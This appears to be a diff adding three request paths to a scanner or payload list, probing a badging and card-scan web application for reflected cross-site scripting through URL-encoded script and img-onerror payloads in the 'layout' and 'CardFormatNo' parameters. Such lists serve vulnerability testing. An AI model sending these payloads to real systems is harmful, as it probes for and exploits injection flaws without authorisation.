@@ -1,0 +1,3 @@
+/badging/badge_template_v0.php?layout=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/card_scan.php?No=0000&ReaderNo=0000&CardFormatNo=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E
+/badging/badge_template_v0.php?layout=1&type=
